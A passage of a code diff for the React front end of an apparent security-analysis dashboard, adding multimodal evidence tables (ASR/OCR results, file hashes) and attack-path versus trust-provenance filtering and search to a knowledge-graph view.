+          </CardHeader>
+          <CardContent>
+            <Table>
+              <TableHeader>
+                <TableRow>
+                  <TableHead>类型</TableHead>
+                  <TableHead>来源</TableHead>
+                  <TableHead>识别文本</TableHead>
+                  <TableHead>置信度</TableHead>
+                  <TableHead>引擎</TableHead>
+                </TableRow>
+              </TableHeader>
+              <TableBody>
+                {textRecognitions.map((item) => (
+                  <TableRow key={`${item.evidence_id}-${item.evidence_type}-${item.source_path}-${item.recognized_text}`}>
+                    <TableCell>
+                      <Badge variant='outline' className={cn('rounded-md', multimodalRecognitionClass(item.evidence_type))}>
+                        {multimodalRecognitionLabel(item.evidence_type)}
+                      </Badge>
+                    </TableCell>
+                    <TableCell className='min-w-[220px]'>
+                      <div className='font-medium'>{item.source_name}</div>
+                      <code className='mt-1 block break-all text-xs text-muted-foreground'>{item.evidence_id}</code>
+                      <code className='mt-1 block break-all text-xs text-muted-foreground'>{item.source_path}</code>
+                    </TableCell>
+                    <TableCell className='max-w-[560px]'>
+                      <div className='whitespace-pre-wrap rounded-md bg-muted px-3 py-2 text-sm leading-6'>
+                        {item.recognized_text}
+                      </div>
+                    </TableCell>
+                    <TableCell className='whitespace-nowrap'>{Math.round((item.confidence ?? 0) * 100)}%</TableCell>
+                    <TableCell className='text-sm text-muted-foreground'>{item.engine}</TableCell>
+                  </TableRow>
+                ))}
+                {!textRecognitions.length ? (
+                  <TableRow>
+                    <TableCell colSpan={5} className='h-24 text-center text-sm text-muted-foreground'>
+                      暂无文本证据；安装 ASR/OCR 引擎后上传音频或截图会在这里显示识别结果。
+                    </TableCell>
+                  </TableRow>
+                ) : null}
+              </TableBody>
+            </Table>
+          </CardContent>
+        </Card>
+
+        <Card className='rounded-md'>
+          <CardHeader>
+            <CardTitle className='flex items-center gap-2 text-base'>
+              <ClipboardList className='size-4 text-emerald-600' />
+              证据来源
+            </CardTitle>
+            <CardDescription>统一证据编号、来源类型、文件路径、hash 和上传时间</CardDescription>
+          </CardHeader>
+          <CardContent>
+            <Table>
+              <TableHeader>
+                <TableRow>
+                  <TableHead>类型</TableHead>
+                  <TableHead>Evidence ID</TableHead>
+                  <TableHead>文件路径</TableHead>
+                  <TableHead>元数据</TableHead>
+                  <TableHead>大小</TableHead>
+                  <TableHead>上传时间</TableHead>
+                </TableRow>
+              </TableHeader>
+              <TableBody>
+                {evidence.map((item) => (
+                  <TableRow key={item.evidence_id}>
+                    <TableCell>
+                      <MultimodalSourceBadge sourceType={item.source_type} />
+                    </TableCell>
+                    <TableCell className='min-w-[220px]'>
+                      <div className='font-medium'>{item.original_filename || item.filename}</div>
+                      <code className='mt-1 block break-all text-xs text-muted-foreground'>{item.evidence_id}</code>
+                      <code className='mt-1 block truncate text-xs text-muted-foreground' title={item.sha256}>
+                        sha256:{item.sha256.slice(0, 18)}...
+                      </code>
+                    </TableCell>
+                    <TableCell className='max-w-[360px]'>
+                      <code className='block break-all rounded bg-muted px-2 py-1 text-xs'>
+                        {item.relative_path || item.file_path}
+                      </code>
+                    </TableCell>
+                    <TableCell className='min-w-[160px] text-sm text-muted-foreground'>
+                      {multimodalMetadataSummary(item)}
+                    </TableCell>
+                    <TableCell className='whitespace-nowrap'>{formatBytes(item.size_bytes)}</TableCell>
+                    <TableCell className='whitespace-nowrap font-mono text-xs'>
+                      {formatTimestamp(item.uploaded_at)}
+                    </TableCell>
+                  </TableRow>
+                ))}
+                {!evidence.length ? (
+                  <TableRow>
+                    <TableCell colSpan={6} className='h-24 text-center text-sm text-muted-foreground'>
+                      暂无多模态证据来源。
+                    </TableCell>
+                  </TableRow>
+                ) : null}
+              </TableBody>
+            </Table>
+          </CardContent>
+        </Card>
+      </div>
+
+      <div className='space-y-4 xl:sticky xl:top-20 xl:self-start'>
+        <Card className='rounded-md'>
+          <CardHeader>
+            <CardTitle className='flex items-center gap-2 text-base'>
+              <Boxes className='size-4 text-cyan-600' />
+              存储索引
+            </CardTitle>
+            <CardDescription>storage/multimodal 下的原始文件和索引</CardDescription>
+          </CardHeader>
+          <CardContent className='space-y-3'>
+            <div className='rounded-md border p-3'>
+              <div className='text-xs text-muted-foreground'>目录</div>
+              <code className='mt-1 block break-all text-xs'>
+                {summary?.storage_relative_dir || 'storage/multimodal'}
+              </code>
+            </div>
+            <div className='grid grid-cols-2 gap-3'>
+              <AuditMetric label='总大小(KB)' value={Math.round((summary?.total_size_bytes ?? 0) / 1024)} tone='slate' />
+              <AuditMetric label='耗时(秒)' value={Math.round(summary?.duration_seconds ?? 0)} tone='cyan' />
+            </div>
+          </CardContent>
+        </Card>
+
+        <Card className='rounded-md'>
+          <CardHeader>
+            <CardTitle className='flex items-center gap-2 text-base'>
+              <TerminalSquare className='size-4 text-slate-600' />
+              多模态工具
+            </CardTitle>
+            <CardDescription>Whisper/faster-whisper 做 ASR，PaddleOCR/Tesseract 做截图 OCR</CardDescription>
+          </CardHeader>
+          <CardContent>
+            <ScannerStatusList scanners={result?.tools ?? []} />
+          </CardContent>
+        </Card>
+
+        <Card className='rounded-md'>
+          <CardHeader>
+            <CardTitle className='flex items-center gap-2 text-base'>
+              <FileSearch className='size-4 text-orange-600' />
+              派生产物
+            </CardTitle>
+            <CardDescription>音频 wav 归一化和视频帧抽取结果</CardDescription>
+          </CardHeader>
+          <CardContent className='space-y-2'>
+            {derivedArtifacts.length ? derivedArtifacts.map((artifact) => (
+              <div key={`${artifact.evidence_id}-${artifact.kind}-${artifact.path}`} className='rounded-md border p-3'>
+                <div className='flex items-center justify-between gap-3'>
+                  <Badge variant='outline' className='rounded-md'>
+                    {artifact.kind}
+                  </Badge>
+                  <span className='text-xs text-muted-foreground'>{artifact.tool}</span>
+                </div>
+                <div className='mt-2 text-sm font-medium'>{artifact.source_name}</div>
+                <code className='mt-1 block break-all text-xs text-muted-foreground'>
+                  {artifact.relative_path || artifact.path}
+                </code>
+              </div>
+            )) : (
+              <div className='rounded-md border border-dashed p-4 text-sm text-muted-foreground'>
+                暂无派生产物；FFmpeg 可用时会生成音频 wav 或视频帧。
+              </div>
+            )}
+          </CardContent>
+        </Card>
+
+        {warnings.length ? (
+          <Card className='rounded-md'>
+            <CardHeader>
+              <CardTitle className='flex items-center gap-2 text-base'>
+                <AlertTriangle className='size-4 text-amber-600' />
+                处理提示
+              </CardTitle>
+            </CardHeader>
+            <CardContent className='space-y-2'>
+              {warnings.map((warning) => (
+                <div key={warning} className='rounded-md bg-muted px-3 py-2 text-xs text-muted-foreground'>
+                  {warning}
+                </div>
+              ))}
+            </CardContent>
+          </Card>
+        ) : null}
+      </div>
+    </div>
+  )
+}
+
+function MultimodalSourceBadge({ sourceType }: { sourceType: MultimodalSourceType }) {
+  const Icon = sourceType === 'audio' ? Music2 : sourceType === 'video' ? Video : Images
+  const className =
+    sourceType === 'audio'
+      ? statusClasses.active
+      : sourceType === 'video'
+        ? severityClasses.medium
+        : 'border-cyan-200 bg-cyan-50 text-cyan-700 dark:border-cyan-900 dark:bg-cyan-950/45 dark:text-cyan-300'
+  return (
+    <Badge variant='outline' className={cn('rounded-md', className)}>
+      <Icon className='size-3.5' />
+      {sourceType === 'audio' ? '音频' : sourceType === 'video' ? '视频' : '图像'}
+    </Badge>
+  )
+}
+
+function entityTypeLabel(value: string) {
+  const labels: Record<string, string> = {
+    ip: 'IP',
+    domain: '域名',
+    cve: 'CVE',
+    package: '依赖包',
+    api_path: '接口',
+    service: '服务',
+    action: '行为',
+    time: '时间',
+    secret_keyword: '凭据',
+  }
+  return labels[value] ?? value
+}
+
+function entityBadgeClass(value: string) {
+  if (value === 'ip' || value === 'package') return severityClasses.high
+  if (value === 'api_path' || value === 'secret_keyword') return severityClasses.medium
+  if (value === 'action') return 'border-cyan-200 bg-cyan-50 text-cyan-700 dark:border-cyan-900 dark:bg-cyan-950/45 dark:text-cyan-300'
+  if (value === 'time') return statusClasses.observed
+  return statusClasses.active
+}
+
+function multimodalMetadataSummary(item: MultimodalEvidence) {
+  const width = Number(item.metadata?.width || 0)
+  const height = Number(item.metadata?.height || 0)
+  const duration = Number(item.metadata?.duration_seconds || 0)
+  const codec = String(item.metadata?.video_codec || item.metadata?.audio_codec || '')
+  const pieces = [
+    width && height ? `${width}x${height}` : '',
+    duration ? `${duration.toFixed(duration > 10 ? 1 : 2)}s` : '',
+    codec,
+    item.derived?.length ? `${item.derived.length} derived` : '',
+  ].filter(Boolean)
+  return pieces.join(' · ') || item.mime_type
+}
+
+function multimodalRecognitionLabel(value: string) {
+  if (value === 'audio_asr') return '音频 ASR'
+  if (value === 'visual_ocr') return '图片 OCR'
+  return value || '文本识别'
+}
+
+function multimodalRecognitionClass(value: string) {
+  if (value === 'audio_asr') return statusClasses.active
+  if (value === 'visual_ocr') return 'border-cyan-200 bg-cyan-50 text-cyan-700 dark:border-cyan-900 dark:bg-cyan-950/45 dark:text-cyan-300'
+  return statusClasses.observed
+}
+
 function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
   const graph = workspace.graph
   const graphNodes = graph?.nodes ?? []
@@ -2872,11 +3692,29 @@ function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
   const attackPaths = graph?.attack_paths ?? []
   const [selectedPathId, setSelectedPathId] = useState<string | null>(null)
   const [pathOnlyMode, setPathOnlyMode] = useState(false)
+  const [activeNodeTypeFilter, setActiveNodeTypeFilter] = useState<string | null>(null)
+  const [graphSearch, setGraphSearch] = useState('')
+  const [graphDisplayMode, setGraphDisplayMode] = useState<GraphDisplayMode>('all')
   const [expandedPathIds, setExpandedPathIds] = useState<Set<string>>(new Set())
-  const selectedPath = useMemo(
-    () => attackPaths.find((path) => path.id === selectedPathId) ?? attackPaths[0],
-    [attackPaths, selectedPathId]
+  const attackPathList = useMemo(
+    () => attackPaths.filter((path) => !isTrustProvenancePath(path)),
+    [attackPaths]
   )
+  const trustPathList = useMemo(
+    () => attackPaths.filter((path) => isTrustProvenancePath(path)),
+    [attackPaths]
+  )
+  const displayedPaths = useMemo(() => {
+    if (graphDisplayMode === 'attack') return attackPathList
+    if (graphDisplayMode === 'trust') return trustPathList
+    return attackPaths
+  }, [attackPathList, attackPaths, graphDisplayMode, trustPathList])
+  const selectedPath = useMemo(
+    () => displayedPaths.find((path) => path.id === selectedPathId) ?? displayedPaths[0] ?? attackPaths[0],
+    [attackPaths, displayedPaths, selectedPathId]
+  )
+  const selectedPathIsTrust = isTrustProvenancePath(selectedPath)
+  const selectedPathIsVerifiedTrust = isVerifiedProvenancePath(selectedPath)
   const highlightedNodeIds = useMemo(
     () => new Set(selectedPath?.node_ids ?? []),
     [selectedPath]
@@ -2885,32 +3723,96 @@ function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
     () => new Set(selectedPath?.edge_ids ?? []),
     [selectedPath]
   )
-  const visibleGraphNodes = useMemo(
+  const modeScopedNodeIds = useMemo(() => {
+    if (graphDisplayMode === 'all') return null
+    return new Set(displayedPaths.flatMap((path) => path.node_ids ?? []))
+  }, [displayedPaths, graphDisplayMode])
+  const modeScopedEdgeIds = useMemo(() => {
+    if (graphDisplayMode === 'all') return null
+    return new Set(displayedPaths.flatMap((path) => path.edge_ids ?? []))
+  }, [displayedPaths, graphDisplayMode])
+  const modeGraphNodes = useMemo(
+    () => modeScopedNodeIds
+      ? graphNodes.filter((node) => modeScopedNodeIds.has(node.id))
+      : graphNodes,
+    [graphNodes, modeScopedNodeIds]
+  )
+  const modeGraphEdges = useMemo(
+    () => modeScopedEdgeIds
+      ? graphEdges.filter((edge) => modeScopedEdgeIds.has(edge.id))
+      : graphEdges,
+    [graphEdges, modeScopedEdgeIds]
+  )
+  const baseGraphNodes = useMemo(
     () =>
       pathOnlyMode && selectedPath
-        ? graphNodes.filter((node) => highlightedNodeIds.has(node.id))
-        : graphNodes,
-    [graphNodes, highlightedNodeIds, pathOnlyMode, selectedPath]
+        ? modeGraphNodes.filter((node) => highlightedNodeIds.has(node.id))
+        : modeGraphNodes,
+    [highlightedNodeIds, modeGraphNodes, pathOnlyMode, selectedPath]
+  )
+  const baseGraphEdges = useMemo(
+    () =>
+      pathOnlyMode && selectedPath
+        ? modeGraphEdges.filter((edge) => highlightedEdgeIds.has(edge.id))
+        : modeGraphEdges,
+    [highlightedEdgeIds, modeGraphEdges, pathOnlyMode, selectedPath]
+  )
+  useEffect(() => {
+    if (!displayedPaths.length) {
+      if (selectedPathId && !attackPaths.some((path) => path.id === selectedPathId)) {
+        setSelectedPathId(null)
+      }
+      return
+    }
+    if (!selectedPathId || !displayedPaths.some((path) => path.id === selectedPathId)) {
+      setSelectedPathId(displayedPaths[0].id)
+    }
+  }, [attackPaths, displayedPaths, selectedPathId])
+  const nodeTypeCounts = useMemo(
+    () => countGraphNodeTypes(baseGraphNodes),
+    [baseGraphNodes]
+  )
+  const visibleGraphNodes = useMemo(
+    () => {
+      const typeFilteredNodes = activeNodeTypeFilter
+        ? baseGraphNodes.filter((node) => node.type === activeNodeTypeFilter)
+        : baseGraphNodes
+      return filterGraphNodesBySearch(typeFilteredNodes, graphSearch)
+    },
+    [activeNodeTypeFilter, baseGraphNodes, graphSearch]
   )
   const visibleGraphEdges = useMemo(
-    () =>
-      pathOnlyMode && selectedPath
-        ? graphEdges.filter((edge) => highlightedEdgeIds.has(edge.id))
-        : graphEdges,
-    [graphEdges, highlightedEdgeIds, pathOnlyMode, selectedPath]
+    () => filterGraphEdgesForNodes(baseGraphEdges, visibleGraphNodes),
+    [baseGraphEdges, visibleGraphNodes]
+  )
+  const searchMatchedCount = useMemo(
+    () => (graphSearch.trim() ? filterGraphNodesBySearch(baseGraphNodes, graphSearch).length : 0),
+    [baseGraphNodes, graphSearch]
   )
   const pipeline = workspace.pipeline ?? []
-  const graphFilters = [
-    { label: '资产', count: workspace.facts?.summary?.asset_count ?? graphNodes.length },
-    { label: '依赖', count: workspace.dependencies?.length ?? 0 },
-    { label: 'CI', count: pipeline.length },
-    { label: '日志', count: workspace.logs?.length ?? 0 },
-    { label: '攻击路径', count: attackPaths.length },
-  ]
+  const displayModes = useMemo(
+    () => [
+      { value: 'attack' as const, label: '攻击路径', count: attackPathList.length, icon: <Siren className='size-3.5' /> },
+      { value: 'trust' as const, label: '可信证明链', count: trustPathList.length, icon: <ShieldCheck className='size-3.5' /> },
+      { value: 'all' as const, label: '全部', count: attackPaths.length, icon: <Network className='size-3.5' /> },
+    ],
+    [attackPathList.length, attackPaths.length, trustPathList.length]
+  )
+  const graphFilters = graphNodeFilters(baseGraphNodes, nodeTypeCounts)
   const nodes = useMemo<Node[]>(
     () =>
       visibleGraphNodes.map((node) => {
         const isPathNode = highlightedNodeIds.has(node.id)
+        const pathBorder = selectedPathIsVerifiedTrust
+          ? '2px solid color-mix(in oklch, #059669 72%, transparent)'
+          : selectedPathIsTrust
+            ? '2px solid color-mix(in oklch, #0f766e 62%, transparent)'
+          : '2px solid color-mix(in oklch, var(--destructive) 70%, transparent)'
+        const pathShadow = selectedPathIsVerifiedTrust
+          ? '0 10px 24px color-mix(in oklch, #059669 18%, transparent)'
+          : selectedPathIsTrust
+            ? '0 10px 24px color-mix(in oklch, #0f766e 14%, transparent)'
+          : '0 10px 24px color-mix(in oklch, var(--destructive) 18%, transparent)'
         return {
           id: node.id,
           position: node.position || graphPositions[node.id] || { x: 0, y: 0 },
@@ -2922,11 +3824,15 @@ function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
                   <span
                     className={cn(
                       'size-2 rounded-full',
-                      node.risk === 'critical'
+                      isPathNode && selectedPathIsTrust
+                        ? 'bg-emerald-500'
+                        : node.risk === 'critical'
                         ? 'bg-red-500'
                         : node.risk === 'high'
                           ? 'bg-orange-500'
-                          : 'bg-amber-500'
+                          : node.risk === 'low'
+                            ? 'bg-emerald-500'
+                            : 'bg-amber-500'
                     )}
                   />
                 </div>
@@ -2944,20 +3850,16 @@ function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
           },
           style: {
             borderRadius: 8,
-            border: isPathNode
-              ? '2px solid color-mix(in oklch, var(--destructive) 70%, transparent)'
-              : '1px solid var(--border)',
+            border: isPathNode ? pathBorder : '1px solid var(--border)',
             background: 'var(--background)',
             opacity: !pathOnlyMode && selectedPath && !isPathNode ? 0.42 : 1,
             padding: 8,
             width: 178,
-            boxShadow: isPathNode
-              ? '0 10px 24px color-mix(in oklch, var(--destructive) 18%, transparent)'
-              : '0 8px 18px color-mix(in oklch, var(--foreground) 7%, transparent)',
+            boxShadow: isPathNode ? pathShadow : '0 8px 18px color-mix(in oklch, var(--foreground) 7%, transparent)',
           },
         }
       }),
-    [visibleGraphNodes, highlightedNodeIds, pathOnlyMode, selectedPath]
+    [visibleGraphNodes, highlightedNodeIds, pathOnlyMode, selectedPath, selectedPathIsTrust, selectedPathIsVerifiedTrust]
   )
 
   const edges = useMemo<Edge[]>(
@@ -2965,6 +3867,7 @@ function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
       visibleGraphEdges.map((edge) => {
         const isPathEdge = highlightedEdgeIds.has(edge.id)
         const isEvidenceEdge = isEvidenceSupportEdge(edge.type)
+        const pathColor = selectedPathIsVerifiedTrust ? '#059669' : selectedPathIsTrust ? '#0f766e' : '#dc2626'
         return {
           id: edge.id,
           source: edge.source,
@@ -2978,17 +3881,17 @@ function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
           },
           markerEnd: {
             type: MarkerType.ArrowClosed,
-            color: isPathEdge ? '#dc2626' : isEvidenceEdge ? '#0891b2' : '#94a3b8',
+            color: isPathEdge ? pathColor : isEvidenceEdge ? '#0891b2' : '#94a3b8',
           },
           style: {
-            stroke: isPathEdge ? '#dc2626' : isEvidenceEdge ? '#0891b2' : '#94a3b8',
+            stroke: isPathEdge ? pathColor : isEvidenceEdge ? '#0891b2' : '#94a3b8',
             strokeDasharray: isPathEdge ? undefined : isEvidenceEdge ? '4 4' : '2 6',
             strokeWidth: isPathEdge ? 3.4 : isEvidenceEdge ? 2 : 1.4,
             opacity: isPathEdge ? 1 : isEvidenceEdge ? 0.78 : 0.34,
           },
         }
       }),
-    [visibleGraphEdges, highlightedEdgeIds]
+    [visibleGraphEdges, highlightedEdgeIds, selectedPathIsTrust, selectedPathIsVerifiedTrust]
   )
 
   function togglePathExpanded(pathId: string) {
@@ -3011,9 +3914,63 @@ function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
             <Network className='size-4 text-cyan-600' />
             图谱筛选
           </CardTitle>
-          <CardDescription>按证据类型聚焦路径</CardDescription>
+          <CardDescription>按节点类型和关键词聚焦路径</CardDescription>
         </CardHeader>
         <CardContent className='space-y-2'>
+          <div className='space-y-2'>
+            <div className='text-xs font-medium text-muted-foreground'>显示模式</div>
+            <div className='grid grid-cols-1 gap-2'>
+              {displayModes.map((mode) => (
+                <button
+                  key={mode.value}
+                  type='button'
+                  onClick={() => setGraphDisplayMode(mode.value)}
+                  className={cn(
+                    'flex w-full items-center justify-between rounded-md border px-3 py-2 text-left text-sm transition hover:bg-muted',
+                    graphDisplayMode === mode.value && (
+                      mode.value === 'trust'
+                        ? 'border-emerald-300 bg-emerald-50 text-emerald-800 dark:border-emerald-900 dark:bg-emerald-950/25 dark:text-emerald-200'
+                        : mode.value === 'attack'
+                          ? 'border-red-300 bg-red-50 text-red-800 dark:border-red-900 dark:bg-red-950/25 dark:text-red-200'
+                          : 'border-cyan-300 bg-cyan-50 text-cyan-800 dark:border-cyan-900 dark:bg-cyan-950/25 dark:text-cyan-200'
+                    )
+                  )}
+                >
+                  <span className='flex items-center gap-2'>
+                    {mode.icon}
+                    {mode.label}
+                  </span>
+                  <Badge variant='outline' className='rounded-md'>
+                    {mode.count}
+                  </Badge>
+                </button>
+              ))}
+            </div>
+          </div>
+          <Separator />
+          <div className='space-y-2'>
+            <Label htmlFor='graph-node-search' className='text-xs text-muted-foreground'>
+              搜索节点
+            </Label>
+            <div className='relative'>
+              <Search className='pointer-events-none absolute left-3 top-1/2 size-3.5 -translate-y-1/2 text-muted-foreground' />
+              <Input
+                id='graph-node-search'
+                value={graphSearch}
+                onChange={(event) => setGraphSearch(event.target.value)}
+                placeholder='名称、类型、证据...'
+                className='h-9 rounded-md pl-8 text-sm'
+              />
+            </div>
+            {graphSearch.trim() ? (
+              <div className='flex items-center justify-between rounded-md bg-muted/35 px-3 py-2 text-xs text-muted-foreground'>
+                <span>匹配节点</span>
+                <Badge variant='outline' className='rounded-md'>
+                  {searchMatchedCount}
+                </Badge>
+              </div>
+            ) : null}
+          </div>
           <div className='mb-3 rounded-md border bg-muted/25 px-3 py-2'>
             <div className='flex items-center justify-between gap-3'>
               <div className='min-w-0'>
@@ -3032,9 +3989,13 @@ function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
           </div>
           {graphFilters.map((filter) => (
             <button
-              key={filter.label}
+              key={filter.type || 'all'}
               type='button'
-              className='flex w-full items-center justify-between rounded-md border px-3 py-2 text-left text-sm hover:bg-muted'
+              onClick={() => setActiveNodeTypeFilter(filter.type)}
+              className={cn(
+                'flex w-full items-center justify-between rounded-md border px-3 py-2 text-left text-sm hover:bg-muted',
+                activeNodeTypeFilter === filter.type && 'border-cyan-300 bg-cyan-50 text-cyan-800 dark:border-cyan-900 dark:bg-cyan-950/25 dark:text-cyan-200'
+              )}
             >
               <span>{filter.label}</span>
               <Badge variant='outline' className='rounded-md'>
@@ -3042,6 +4003,21 @@ function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
               </Badge>
             </button>
           ))}
+          {(activeNodeTypeFilter || graphSearch.trim()) ? (
+            <Button
+              type='button'
+              variant='outline'
+              size='sm'
+              className='mt-2 w-full rounded-md'
+              onClick={() => {
+                setActiveNodeTypeFilter(null)
+                setGraphSearch('')
+              }}
+            >
+              <RefreshCw className='size-3.5' />
+              清除筛选
+            </Button>
+          ) : null}
         </CardContent>
       </Card>
 
@@ -3069,6 +4045,11 @@ function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
                 <Badge variant='outline' className='rounded-md'>
                   置信度 {Math.round((graph.summary.average_path_confidence ?? 0) * 100)}%
                 </Badge>
+                {(activeNodeTypeFilter || graphSearch.trim()) ? (
+                  <Badge variant='outline' className='rounded-md'>
+                    当前显示 {nodes.length} 节点
+                  </Badge>
+                ) : null}
               </div>
             ) : null}
           </div>
@@ -3091,6 +4072,17 @@ function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
                     仅显示当前路径
                   </Badge>
                 ) : null}
+                {graphDisplayMode !== 'all' ? (
+                  <Badge
+                    variant='outline'
+                    className={cn(
+                      'rounded-md',
+                      graphDisplayMode === 'trust' ? statusClasses.active : severityClasses.high
+                    )}
+                  >
+                    {graphDisplayMode === 'trust' ? '可信证明链模式' : '攻击路径模式'}
+                  </Badge>
+                ) : null}
                 <Badge variant='outline' className='rounded-md'>
                   {(selectedPath.node_ids || []).length} 节点 · {(selectedPath.edge_ids || []).length} 关系
                 </Badge>
@@ -3098,10 +4090,16 @@ function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
               <p className='mt-2 text-sm leading-6 text-muted-foreground'>
                 {selectedPath.conclusion || selectedPath.description}
               </p>
-              <div className='mt-3 grid gap-3 md:grid-cols-2'>
-                <EvidenceGapPanel path={selectedPath} compact />
-                <UpgradeHintPanel path={selectedPath} compact />
-              </div>
+              {selectedPathIsTrust ? (
+                <div className='mt-3'>
+                  <TrustedProvenancePanel path={selectedPath} compact />
+                </div>
+              ) : (
+                <div className='mt-3 grid gap-3 md:grid-cols-2'>
+                  <EvidenceGapPanel path={selectedPath} compact />
+                  <UpgradeHintPanel path={selectedPath} compact />
+                </div>
+              )}
             </div>
           ) : null}
           <div className='h-[600px] max-h-[64svh] min-h-[520px] overflow-hidden rounded-md border'>
@@ -3120,7 +4118,9 @@ function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
               </ReactFlow>
             ) : (
               <div className='flex h-full items-center justify-center p-6 text-center text-sm text-muted-foreground'>
-                暂无图谱节点；完成代码、供应链、CI/CD 或日志扫描后会在这里生成证据关系。
+                {activeNodeTypeFilter || graphSearch.trim()
+                  ? '没有匹配当前类型或搜索词的节点，请清除筛选后重试。'
+                  : '暂无图谱节点；完成代码、供应链、CI/CD 或日志扫描后会在这里生成证据关系。'}
               </div>
             )}
           </div>
@@ -3136,9 +4136,10 @@ function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
           <CardDescription>回答这些证据能不能串成一次真实攻击路径</CardDescription>
         </CardHeader>
         <CardContent className='space-y-3'>
-          {attackPaths.map((path) => {
+          {displayedPaths.map((path) => {
             const isSelected = selectedPath?.id === path.id
             const isExpanded = expandedPathIds.has(path.id)
+            const isTrustPath = isTrustProvenancePath(path)
             return (
             <div
               key={path.id}
@@ -3153,13 +4154,22 @@ function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
               }}
               className={cn(
                 'block w-full cursor-pointer rounded-md border p-3 text-left transition hover:bg-muted/35',
-                isSelected && 'border-red-300 bg-red-50/45 shadow-sm dark:border-red-900 dark:bg-red-950/20'
+                isSelected && (
+                  isVerifiedProvenancePath(path)
+                    ? 'border-emerald-300 bg-emerald-50/50 shadow-sm dark:border-emerald-900 dark:bg-emerald-950/20'
+                    : isTrustPath
+                      ? 'border-teal-300 bg-teal-50/45 shadow-sm dark:border-teal-900 dark:bg-teal-950/20'
+                    : 'border-red-300 bg-red-50/45 shadow-sm dark:border-red-900 dark:bg-red-950/20'
+                )
               )}
             >
               <div className='flex items-center justify-between gap-2'>
                 <div className='font-medium'>{path.title}</div>
-                <Badge variant='outline' className={cn('rounded-md', severityClasses[path.severity] || statusClasses.observed)}>
-                  {path.score}
+                <Badge
+                  variant='outline'
+                  className={cn('rounded-md', isTrustPath ? statusClasses.active : severityClasses[path.severity] || statusClasses.observed)}
+                >
+                  {isTrustPath ? `可信 ${path.trust_score ?? path.score}` : path.score}
                 </Badge>
               </div>
               <div className='mt-2 flex flex-wrap gap-2'>
@@ -3173,10 +4183,16 @@ function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
               <p className='mt-2 text-sm leading-6 text-muted-foreground'>
                 {path.conclusion || path.description}
               </p>
-              <div className='mt-3 space-y-2'>
-                <EvidenceGapPanel path={path} compact />
-                <UpgradeHintPanel path={path} compact />
-              </div>
+              {isTrustPath ? (
+                <div className='mt-3'>
+                  <TrustedProvenancePanel path={path} compact />
+                </div>
+              ) : (
+                <div className='mt-3 space-y-2'>
+                  <EvidenceGapPanel path={path} compact />
+                  <UpgradeHintPanel path={path} compact />
+                </div>
+              )}
               {path.path_steps?.length ? (
                 <div className='mt-3'>
                   <button
@@ -3256,7 +4272,7 @@ function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
             </div>
             )
           })}
-          {!attackPaths.length
+          {!displayedPaths.length && !attackPaths.length
             ? pipeline.map((step) => (
                 <div key={step.step} className='rounded-md border p-3'>
                   <div className='flex items-center justify-between gap-2'>
@@ -3269,6 +4285,11 @@ function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
                 </div>
               ))
             : null}
+          {!displayedPaths.length && attackPaths.length ? (
+            <div className='rounded-md border border-dashed p-4 text-sm text-muted-foreground'>
+              当前模式暂无路径；切换到“全部”查看已有图谱关系。
+            </div>
+          ) : null}
           {!attackPaths.length && !pipeline.length ? (
             <div className='rounded-md border border-dashed p-4 text-sm text-muted-foreground'>
               暂无攻击路径；完成扫描后会根据证据链生成可验证路径。
@@ -3326,6 +4347,52 @@ function UpgradeHintPanel({
   )
 }
 
+function TrustedProvenancePanel({
+  path,
+  compact = false,
+}: {
+  path: KnowledgeGraphAttackPath
+  compact?: boolean
+}) {
+  const checks = trustedProvenanceChecks(path)
+  const verified = path.verdict === 'verified-provenance-chain' && checks.every((check) => isTrustCheckPassLike(check.status))
+  const score = path.trust_score ?? path.score ?? 0
+
+  return (
+    <div className={cn('rounded-md border border-emerald-200 bg-emerald-50/55 dark:border-emerald-900 dark:bg-emerald-950/20', compact ? 'p-3' : 'p-4')}>
+      <div className='flex flex-wrap items-center justify-between gap-2'>
+        <div className='flex items-center gap-2 text-sm font-medium text-emerald-800 dark:text-emerald-200'>
+          <ShieldCheck className='size-4' />
+          产物可信证明链：{verified ? '已验证' : '需复核'}
+        </div>
+        <Badge variant='outline' className={cn('rounded-md', verified ? statusClasses.active : severityClasses.medium)}>
+          可信评分 {score}
+        </Badge>
+      </div>
+      <div className='mt-3 grid gap-2'>
+        {checks.slice(0, 10).map((check) => (
+          <div key={check.id || check.name || check.label} className='grid gap-1 rounded-md border bg-background/75 px-3 py-2 text-xs sm:grid-cols-[96px_1fr]'>
+            <div className='flex items-center gap-1.5 font-medium'>
+              {isTrustCheckPassLike(check.status) ? (
+                <CheckCircle2 className='size-3.5 text-emerald-600' />
+              ) : (
+                <AlertTriangle className='size-3.5 text-amber-600' />
+              )}
+              {check.label || check.name}
+            </div>
+            <div className='min-w-0'>
+              <div className='font-medium text-foreground'>{check.value || trustCheckStatusLabel(check.status)}</div>
+              {check.evidence ? (
+                <div className='mt-0.5 line-clamp-2 text-muted-foreground'>{check.evidence}</div>
+              ) : null}
+            </div>
+          </div>
+        ))}
+      </div>
+    </div>
+  )
+}
+
 function pathEvidenceGaps(path: KnowledgeGraphAttackPath) {
   const explicitGaps = (path.gaps ?? []).filter(Boolean)
   if (explicitGaps.length) return explicitGaps
@@ -3365,17 +4432,155 @@ function pathEndpointLabel(path: KnowledgeGraphAttackPath, nodeType: string) {
   return path.path_steps?.find((step) => step.source_type === nodeType)?.source
 }
 
+function isTrustProvenancePath(path?: KnowledgeGraphAttackPath | null) {
+  if (!path) return false
+  return (
